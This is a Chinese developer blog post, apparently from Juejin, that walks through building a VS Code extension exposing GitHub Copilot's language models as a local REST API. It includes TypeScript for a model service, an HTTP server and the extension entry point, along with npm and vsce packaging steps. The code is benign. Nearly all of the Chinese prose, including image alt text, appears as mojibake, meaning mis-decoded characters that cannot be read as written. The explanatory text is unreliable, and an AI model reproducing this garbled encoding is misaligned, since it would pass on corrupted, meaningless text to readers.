<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c880d074a8e4747871511dc00b293bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56OK56OK6JC96JC9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766098188&amp;x-signature=H25NlgH8CWdbvWkzKXoYYsTLq%2BU%3D" alt="ä½¿ç”¨ Copilot æ‰¹é‡ç”Ÿæˆåšå®¢çš„å¹´åº¦æ€»ç»“" loading="lazy"/></p>
<p>ç©¶å…¶åŸå› ï¼Œæ˜¯å› ä¸º Copilot æ ¹æœ¬æ²¡æœ‰è°ƒç”¨å¤§æ¨¡å‹å»ç”Ÿæˆæ€»ç»“ï¼Œè€Œæ˜¯åœ¨ç¨‹åºä¸­å†™äº†ä¸€ç»„å…³é”®è¯ï¼Œåªè¦æ–‡ç« æ ‡é¢˜åŒ¹é…äº†æŸäº›å…³é”®è¯å°±å›ºå®šè¾“å‡ºä¸€ä¸ªåˆ†ç±»ï¼Œç”Ÿæˆçš„æ€»ç»“æ­»æ¿ï¼Œæ²¡æœ‰æ´»åŠ›ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a4a3b41336e49f9b67181ae724ddbad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56OK56OK6JC96JC9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766098188&amp;x-signature=bmH%2FVRMnY%2Ffw%2BS9DQ8Uo5uxNm9Q%3D" alt="ä½¿ç”¨ Copilot æ‰¹é‡ç”Ÿæˆåšå®¢çš„å¹´åº¦æ€»ç»“ä¹‹ä½¿ç”¨çš„è„šæœ¬" loading="lazy"/></p>
<p>çœ‹åˆ°è¿™é‡Œï¼Œæ‚¨ä¸ç¦è¦é—®ï¼šCopilot ä¸çŸ¥é“æˆ‘ä»¬æƒ³è¦çš„æ€»ç»“æ˜¯ç”¨å¤§æ¨¡å‹ç”Ÿæˆå—ï¼Ÿè¿˜æ˜¯æœ‰å“ªäº›éš¾è¨€ä¹‹éšï¼Ÿ</p>
<p>ä¸‹é¢æˆ‘ä»¬å°è¯•ä½¿ç”¨æç¤ºè¯å¼ºåˆ¶è®©å…¶ä½¿ç”¨å¤§æ¨¡å‹æ¥ç”Ÿæˆæ€»ç»“ã€‚</p>
<p>æç¤ºè¯å‘å‡ºåï¼ŒCopilot ä¿®æ”¹åŸå…ˆçš„ Python è„šæœ¬ï¼Œæ”¹ä¸ºè°ƒç”¨ OpenAI æ¥ç”Ÿæˆæ€»ç»“ã€‚ä½†æ˜¯è¦ä½¿ç”¨è¿™ä¸ªç¨‹åºæˆ‘ä»¬éœ€è¦æœ‰ OpenAI è´¦å·ï¼Œå³å¿…é¡»æä¾›ä¸€ä¸ª <code>OPENAI_API_KEY</code> ç»™ Copilotã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5dbf542e747949969d9332d257d8066f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56OK56OK6JC96JC9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766098188&amp;x-signature=%2FxTz01F3tAF3LqkpOO3ccUgtPl4%3D" alt="ä½¿ç”¨ Copilot æ‰¹é‡ç”Ÿæˆåšå®¢çš„å¹´åº¦æ€»ç»“ä¹‹ä½¿ç”¨çš„ OpenAI" loading="lazy"/></p>
<p>çœ‹åˆ°è¿™é‡Œæ‚¨å¯èƒ½è·Ÿæˆ‘ä¸€æ ·æœ‰ä¸€äº›è¿·æƒ‘ï¼Œä½  Copilot Chat ä¸­æ”¯æŒçš„é‚£ä¹ˆå¤šæ¨¡å‹ç›´æ¥æ‹¿æ¥ç”¨ä¸å°±è¡Œäº†å—ï¼Ÿè¿˜è®©æˆ‘ä¸“é—¨å¼€é€šä¸€ä¸ªå¤§æ¨¡å‹è´¦å·ï¼Ÿæˆ–è€…ï¼Œä½ ç”¨ç¬¨ä¸€ç‚¹çš„åŠæ³•ï¼Œåƒè·å–å•ä¸ªåšå®¢çš„æ€»ç»“ä¸€æ ·ï¼Œè‡ªå·±è‡ªåŠ¨ç»„è£…æç¤ºè¯å‘ç»™ Chatï¼Œç„¶åå–å›ç»“æœï¼›ç„¶åå†å‘å‡ºï¼Œå†å–å›ã€‚å¸®æˆ‘å®Œæˆä»»åŠ¡ï¼Œä¸è¡Œå—ï¼Ÿ</p>
<p>å…¶å®ï¼Œè¿™ä¸ªé—®é¢˜æ°å¥½è§¦ç¢°åˆ°äº† Copilot çš„éš¾è¨€ä¹‹éšã€‚å› ä¸º Copilot çš„ç¡®æ²¡æœ‰å°†å¯ä½¿ç”¨çš„æ¨¡å‹ç”¨ REST API çš„æ–¹å¼æš´éœ²å‡ºæ¥ï¼Œæ‰€ä»¥å®ƒç¼–å†™çš„è„šæœ¬æƒ³ä½¿ç”¨æ¨¡å‹æ—¶ï¼Œå¿…é¡»è®©æˆ‘ä»¬æä¾›ä¸€ä¸ªé¢å¤–æ¨¡å‹çš„ <code>API_KEY</code>ã€‚</p>
<p>è¿™å°±æ˜¯æˆ‘ä¸ºä»€ä¹ˆè¦å†™æœ¬æ–‡çš„ç¼˜ç”±ã€‚æˆ‘ä»¬éœ€è¦ç¼–å†™ä¸€ä¸ª VS Code æ‰©å±•ï¼Œæ¥å°† Copilot ä¸­æ¨¡å‹çš„èƒ½åŠ›é€šè¿‡ REST API é‡Šæ”¾å‡ºæ¥ï¼Œä¾›ç¨‹åºå»ä½¿ç”¨ã€‚</p>
<h2 data-id="heading-1">2 ç¼–å†™è¿™ä¸ª VS Code æ‰©å±•</h2>
<p>ä¸‹é¢ç€æ‰‹ç¼–å†™è¿™ä¸ªã€Œå°† Copilot å¤§æ¨¡å‹æš´éœ²ä¸º REST APIã€çš„ VS Code æ‰©å±•ã€‚</p>
<p>å¼€å§‹å‰ï¼Œéœ€è¦ä¿è¯æœ¬åœ°å·²å®‰è£… <code>Node.js</code>ã€‚</p>
<h3 data-id="heading-2">2.1 å‡†å¤‡å·¥ä½œ</h3>
<p>ä¸‹é¢å®‰è£… <code>yo</code> å‘½ä»¤ï¼Œè¯¥å‘½ä»¤ç”¨äºç”Ÿæˆ VC Code æ‰©å±•å·¥ç¨‹çš„è„šæ‰‹æ¶ã€‚</p>
<pre><code class="hljs language-shell" lang="shell">npm install --global yo generator-code
</code></pre>
<p>å®‰è£…å®Œæˆåï¼Œå°† npm çš„å…¨å±€ <code>bin</code> ç›®å½•æ·»åŠ åˆ°ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œæ–¹ä¾¿ç›´æ¥ä½¿ç”¨å®‰è£…çš„å‘½ä»¤ã€‚</p>
<pre><code class="hljs language-shell" lang="shell">echo 'export PATH="$(npm config get prefix)/bin:$PATH"' &gt;&gt; ~/.bashrc
source ~/.bashrc
</code></pre>
<p>ä¸‹é¢ä½¿ç”¨ <code>yo code</code> å‘½ä»¤ç”Ÿæˆ VS Code æ‰©å±•å·¥ç¨‹ <code>copilot-models-rest-api</code> çš„è„šæ‰‹æ¶ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">yo code
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1f72824cb1044c894bfff1bcd13c8b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56OK56OK6JC96JC9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766098188&amp;x-signature=pqQ02bnbElAtwgooMMcGKxOLIMk%3D" alt="ç”Ÿæˆ VS Code æ‰©å±•å·¥ç¨‹è„šæ‰‹æ¶" loading="lazy"/></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œç”Ÿæˆçš„å·¥ç¨‹ä¸ºä¸€ä¸ªæ ‡å‡†çš„ TypeScript å·¥ç¨‹ï¼Œå…¶è°ƒç”¨å…¥å£ä¸º <code>src/extension.ts</code>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b474f7e4a01455bb33a3696dec933f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56OK56OK6JC96JC9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766098188&amp;x-signature=f98yJwzqmzsnBP71nXevAtqo4S8%3D" alt="ç”Ÿæˆçš„ VS Code æ‰©å±•å·¥ç¨‹è„šæ‰‹æ¶" loading="lazy"/></p>
<h3 data-id="heading-3">2.2 ç¼–å†™æ ¸å¿ƒé€»è¾‘</h3>
<p>æ¥ä¸‹æ¥åœ¨è„šæ‰‹æ¶å·¥ç¨‹ <code>copilot-models-rest-api</code> çš„ <code>src</code> ç›®å½•ä¸‹ç¼–å†™æ ¸å¿ƒé€»è¾‘ã€‚</p>
<h4 data-id="heading-4">aï¼‰LanguageModelService.ts</h4>
<p>é¦–å…ˆï¼Œæ–°å»ºä¸€ä¸ª <code>LanguageModelService.ts</code> æ–‡ä»¶ï¼Œç”¨äºé€šè¿‡ VS Code å†…ç½®çš„ API è·å–åˆ° Copilot çš„å¯ç”¨å¤§è¯­è¨€æ¨¡å‹ï¼Œç„¶åå°è£…å‡ºä¸‰ä¸ªæ–¹æ³•ä¾›åˆ«çš„ <code>ts</code> æ–‡ä»¶è°ƒç”¨ï¼š</p>
<ul>
<li>
<p><code>getAvailableModels()</code></p>
<p>è·å– Copilot æ”¯æŒçš„æ‰€æœ‰å¤§æ¨¡å‹åç§°ï¼›</p>
</li>
<li>
<p><code>getModelById()</code></p>
<p>æ ¹æ®å¤§æ¨¡å‹åç§°è·å–ç‰¹å®šå¤§æ¨¡å‹å¯¹è±¡ï¼›</p>
</li>
<li>
<p><code>createChatCompletion()</code></p>
<p>æŒ‡å®šæƒ³ç”¨çš„å¤§æ¨¡å‹ï¼Œç„¶åä¼ å…¥ä¸€æ®µæ–‡æœ¬ï¼Œå¹¶è¯·æ±‚å¤§æ¨¡å‹è¿”å›ç»“æœã€‚</p>
</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> vscode <span class="hljs-keyword">from</span> <span class="hljs-string">"vscode"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ChatRequest</span>, <span class="hljs-title class_">ChatResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"./types"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">LanguageModelChat</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"vscode"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LanguageModelService</span> {
  <span class="hljs-comment">// ...</span>

  <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">getAvailableModels</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>[]&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> models = <span class="hljs-keyword">await</span> vscode.<span class="hljs-property">lm</span>.<span class="hljs-title function_">selectChatModels</span>({
        <span class="hljs-attr">vendor</span>: <span class="hljs-string">"copilot"</span>,
      });

      <span class="hljs-keyword">if</span> (models.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"No Copilot models available"</span>);
        <span class="hljs-keyword">return</span> [];
      }

      <span class="hljs-keyword">return</span> models.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">model</span>) =&gt;</span> model.<span class="hljs-property">id</span>);
    } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">any</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Error fetching models:"</span>, error);
      <span class="hljs-keyword">return</span> [];
    }
  }

  <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">getModelById</span>(
    modelId?: <span class="hljs-built_in">string</span>
  ): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">LanguageModelChat</span> | <span class="hljs-literal">null</span>&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> models = <span class="hljs-keyword">await</span> vscode.<span class="hljs-property">lm</span>.<span class="hljs-title function_">selectChatModels</span>({
        <span class="hljs-attr">vendor</span>: <span class="hljs-string">"copilot"</span>,
      });
      <span class="hljs-comment">// ...</span>

      <span class="hljs-keyword">const</span> model = models.<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">m</span>) =&gt;</span> m.<span class="hljs-property">id</span> === modelId);
      <span class="hljs-keyword">return</span> model || <span class="hljs-literal">null</span>;
    } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">any</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Error fetching model by ID:"</span>, error);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
  }

  <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">createChatCompletion</span>(<span class="hljs-attr">req</span>: <span class="hljs-title class_">ChatRequest</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ChatResponse</span>&gt; {
    <span class="hljs-keyword">const</span> model = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getModelById</span>(req.<span class="hljs-property">model</span>);
    <span class="hljs-comment">// ...</span>

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> messagePayload = req.<span class="hljs-property">messages</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span>
        vscode.<span class="hljs-property">LanguageModelChatMessage</span>.<span class="hljs-title class_">User</span>(msg)
      );
      <span class="hljs-keyword">const</span> resp = <span class="hljs-keyword">await</span> model.<span class="hljs-title function_">sendRequest</span>(
        messagePayload,
        {},
        <span class="hljs-keyword">new</span> vscode.<span class="hljs-title class_">CancellationTokenSource</span>().<span class="hljs-property">token</span>
      );

      <span class="hljs-keyword">let</span> <span class="hljs-attr">fullText</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">""</span>;
      <span class="hljs-keyword">for</span> <span class="hljs-keyword">await</span> (<span class="hljs-keyword">const</span> chunk <span class="hljs-keyword">of</span> resp.<span class="hljs-property">text</span>) {
        fullText += chunk;
      }
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">reply</span>: fullText, <span class="hljs-attr">model</span>: model.<span class="hljs-property">id</span> };
    } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">any</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Error creating chat completion:"</span>, error);
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">error</span>: <span class="hljs-string">"Error creating chat completion: "</span> + error.<span class="hljs-property">message</span> };
    }
  }
}
</code></pre>
<h4 data-id="heading-5">bï¼‰ApiServer.ts</h4>
<p>æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ <code>ApiServer.ts</code> åŒ…è£…ä¸Šè¿° <code>LanguageModelService</code>ï¼Œä»¥ RESTful API æ–¹å¼æš´éœ²ç”¨æˆ·ä¸å¤§æ¨¡å‹äº¤äº’çš„èƒ½åŠ›ã€‚</p>
<p><code>ApiServer.ts</code> çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>ApiServer.ts</code> ä¸»è¦è´Ÿè´£æ¥æ”¶è¯·æ±‚å¹¶è¿”å›å“åº”ã€‚å…¶æä¾›äº†ä¸€ä¸ª <code>POST /v1/chat/completions</code> API æ¥æ¥æ”¶ç”¨æˆ·è¾“å…¥ä¿¡æ¯ï¼Œå¹¶è°ƒç”¨ <code>LanguageModelService</code> çš„ <code>createChatCompletion()</code> çš„æ–¹æ³•æ¥ç»™å‡ºå›ç­”ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> http <span class="hljs-keyword">from</span> <span class="hljs-string">"http"</span>;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> url <span class="hljs-keyword">from</span> <span class="hljs-string">"url"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">LanguageModelService</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"./languageModelService"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ChatRequest</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"./types"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApiServer</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">server</span>: http.<span class="hljs-property">Server</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">port</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">languageModelService</span>: <span class="hljs-title class_">LanguageModelService</span>;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">port: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">port</span> = port;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">languageModelService</span> = <span class="hljs-title class_">LanguageModelService</span>.<span class="hljs-title function_">getInstance</span>();
  }

  <span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">handleRequest</span>(
    <span class="hljs-attr">req</span>: http.<span class="hljs-property">IncomingMessage</span>,
    <span class="hljs-attr">res</span>: http.<span class="hljs-property">ServerResponse</span>
  ): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">const</span> parsedUrl = url.<span class="hljs-title function_">parse</span>(req.<span class="hljs-property">url</span> || <span class="hljs-string">""</span>, <span class="hljs-literal">true</span>);
    <span class="hljs-keyword">const</span> path = parsedUrl.<span class="hljs-property">pathname</span> || <span class="hljs-string">""</span>;

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> === <span class="hljs-string">"POST"</span>) {
        <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handlePostRequest</span>(path, req, res);
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sendResponse</span>(res, <span class="hljs-number">405</span>, { <span class="hljs-attr">error</span>: <span class="hljs-string">"Method Not Allowed"</span> });
      }
    } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">any</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"request failed"</span>, error);
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sendResponse</span>(res, <span class="hljs-number">500</span>, { <span class="hljs-attr">error</span>: <span class="hljs-string">"Internal Server Error"</span> });
    }
  }

  <span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">handlePostRequest</span>(
    <span class="hljs-attr">path</span>: <span class="hljs-built_in">string</span>,
    <span class="hljs-attr">req</span>: http.<span class="hljs-property">IncomingMessage</span>,
    <span class="hljs-attr">res</span>: http.<span class="hljs-property">ServerResponse</span>
  ): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">if</span> (path === <span class="hljs-string">"/v1/chat/completions"</span>) {
      <span class="hljs-keyword">const</span> body = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">readRequestBody</span>(req);
      <span class="hljs-keyword">const</span> <span class="hljs-attr">chatRequest</span>: <span class="hljs-title class_">ChatRequest</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(body);
      <span class="hljs-keyword">const</span> chatResponse = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">languageModelService</span>.<span class="hljs-title function_">createChatCompletion</span>(
        chatRequest
      );
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sendResponse</span>(res, <span class="hljs-number">200</span>, chatResponse);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sendResponse</span>(res, <span class="hljs-number">404</span>, { <span class="hljs-attr">error</span>: <span class="hljs-string">"Not Found"</span> });
    }
  }

  <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">start</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">server</span> = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Received request: <span class="hljs-subst">${req.method}</span> <span class="hljs-subst">${req.url}</span>`</span>);
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRequest</span>(req, res);
    });
    <span class="hljs-comment">// ...</span>
  }

  <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">stop</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-comment">// ...</span>
  }
}
</code></pre>
<h4 data-id="heading-6">cï¼‰extension.ts</h4>
<p>æœ€åï¼Œä¿®æ”¹ VS Code æ‰©å±•çš„å…¥å£æ–‡ä»¶ <code>extension.ts</code>ï¼Œå°† <code>ApiServer</code> çš„å¯åŠ¨å’Œåœæ­¢å‘½ä»¤æ³¨å†Œåˆ° VS Codeã€‚</p>
<p><code>extension.ts</code> çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> vscode <span class="hljs-keyword">from</span> <span class="hljs-string">"vscode"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ApiServer</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"./apiServer"</span>;

<span class="hljs-keyword">let</span> <span class="hljs-attr">apiServer</span>: <span class="hljs-title class_">ApiServer</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">activate</span>(<span class="hljs-params">context: vscode.ExtensionContext</span>) {
  <span class="hljs-comment">// start API server command</span>
  vscode.<span class="hljs-property">commands</span>.<span class="hljs-title function_">registerCommand</span>(
    <span class="hljs-string">"copilot-models-rest-api.startServer"</span>,
    <span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-keyword">const</span> port = <span class="hljs-number">3001</span>; <span class="hljs-comment">// You can change the port number if needed</span>
      apiServer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApiServer</span>(port);

      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">await</span> apiServer.<span class="hljs-title function_">start</span>();
        vscode.<span class="hljs-property">window</span>.<span class="hljs-title function_">showInformationMessage</span>(
          <span class="hljs-string">`API Server started on port <span class="hljs-subst">${port}</span>`</span>
        );
      } <span class="hljs-keyword">catch</span> (error) {
        vscode.<span class="hljs-property">window</span>.<span class="hljs-title function_">showErrorMessage</span>(<span class="hljs-string">"Failed to start API Server"</span>);
      }
    }
  );

  <span class="hljs-comment">// stop API server command</span>
  vscode.<span class="hljs-property">commands</span>.<span class="hljs-title function_">registerCommand</span>(
    <span class="hljs-string">"copilot-models-rest-api.stopServer"</span>,
    <span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-keyword">if</span> (apiServer) {
        <span class="hljs-keyword">try</span> {
          <span class="hljs-keyword">await</span> apiServer.<span class="hljs-title function_">stop</span>();
          vscode.<span class="hljs-property">window</span>.<span class="hljs-title function_">showInformationMessage</span>(<span class="hljs-string">"API Server stopped"</span>);
        } <span class="hljs-keyword">catch</span> (error) {
          vscode.<span class="hljs-property">window</span>.<span class="hljs-title function_">showErrorMessage</span>(<span class="hljs-string">"Failed to stop API Server"</span>);
        }
      } <span class="hljs-keyword">else</span> {
        vscode.<span class="hljs-property">window</span>.<span class="hljs-title function_">showWarningMessage</span>(<span class="hljs-string">"API Server is not running"</span>);
      }
    }
  );
}

<span class="hljs-comment">// This method is called when your extension is deactivated</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">deactivate</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (apiServer) {
    apiServer.<span class="hljs-title function_">stop</span>().<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">error: <span class="hljs-built_in">Error</span></span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Error stopping API Server:"</span>, error);
    });
  }
}
</code></pre>
<p>è‡³æ­¤ï¼Œæˆ‘ä»¬æƒ³è¦çš„æ‰©å±•çš„æºç éƒ¨åˆ†å°±åŸºæœ¬å®ç°å®Œæˆäº†ã€‚</p>
<h3 data-id="heading-7">2.3 ç”Ÿæˆ vsix æ–‡ä»¶</h3>
<p>æœ€åï¼Œä½¿ç”¨å¦‚ä¸‹ npm å‘½ä»¤å®‰è£…ä¾èµ–å’Œæ‰“åŒ…ã€‚</p>
<pre><code class="hljs language-shell" lang="shell">npm install
npm run package
</code></pre>
<p>ä½¿ç”¨å¦‚ä¸‹ npm å‘½ä»¤å®‰è£… <code>vsce</code> å‘½ä»¤ï¼Œå¹¶ä½¿ç”¨ <code>vsce</code> å‘½ä»¤æ¥å°†å·¥ç¨‹æ‰“åŒ…ä¸ºä¸€ä¸ª <code>.vsix</code> æ–‡ä»¶ã€‚</p>
<pre><code class="hljs language-shell" lang="shell">npm install -g @vscode/vsce

vsce package
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ab79186e43c46cf82b18d07c6966e4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56OK56OK6JC96JC9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766098188&amp;x-signature=32Gj5qa0ANovaCJzNJKj3JbGZVU%3D" alt="ç”Ÿæˆ vsix æ–‡ä»¶" loading="lazy"/></p>
<p>è¿™æ ·ï¼Œæœ‰éœ€è¦çš„æœ‹å‹å°±å¯ä»¥åœ¨ VS Code å®‰è£…è¿™ä¸ªæ‰©å±•ï¼Œç„¶åä½¿ç”¨æˆ‘ä»¬åŒ…è£…å¥½çš„ API äº†ã€‚</p>
<h2 data-id="heading-8">3 ä½¿ç”¨è¿™ä¸ª VS Code æ‰©å±•</h2>
<p>ä¸‹é¢ï¼Œæˆ‘ä»¬åœ¨ VS Code å®‰è£…ä¸Šé¢ç”Ÿæˆçš„ <code>vsix</code> æ‰©å±•ï¼Œç„¶åå°è¯•é‡æ–°ç¼–å†™æç¤ºè¯ï¼Œçœ‹çœ‹å…¶èƒ½å¦å®ç°æ–‡ç« å¼€å¤´çš„ã€Œæ‰¹é‡ç”Ÿæˆåšå®¢å¹´åº¦æ€»ç»“ã€çš„éœ€æ±‚ã€‚</p>
<h3 data-id="heading-9">3.1 å®‰è£…æ‰©å±•</h3>
<p>é¦–å…ˆï¼Œç‚¹å‡» VS Code å·¦ä¾§çš„ Extensions Tabï¼Œç„¶åç‚¹å‡» Install from VSIXï¼Œé€‰æ‹©ä¸Šè¿° <code>.vsix</code> æ–‡ä»¶æ‰€åœ¨ä½ç½®ï¼Œå³å¯å®‰è£…æˆåŠŸã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5be817688ff485a938aca1ad39a7eb6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56OK56OK6JC96JC9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766098188&amp;x-signature=%2Fu5VmnI0IOc%2B0CYUfNpr1xpLJ18%3D" alt="é€‰æ‹© vsix æ–‡ä»¶ï¼Œå®‰è£…æ‰©å±•" loading="lazy"/></p>
<p>æ‰©å±•å®‰è£…æˆåŠŸåï¼Œåœ¨ VS Code é”®å…¥ã€ŒCtrl + Shift + Pã€åï¼Œç‚¹å‡»ã€ŒStart Copilot Models REST API Serverã€å‘½ä»¤ï¼Œå³å¯å¯åŠ¨ API Serverã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c891d37894a41028eb4dc43dcc5bee9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56OK56OK6JC96JC9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766098188&amp;x-signature=spil93jPv%2BIvnpZXzAsyGoaFrFk%3D" alt="è¿è¡Œæ‰©å±•" loading="lazy"/></p>
<p>Server å¯åŠ¨æˆåŠŸåï¼Œå°è¯•ç”¨ Postman è°ƒç”¨ä¸€ä¸‹å’Œæ¨¡å‹å¯¹è¯çš„ APIï¼Œå’¨è¯¢æ¨¡å‹çš„ç»“æœè¢«æˆåŠŸè¿”å›ã€‚</p>
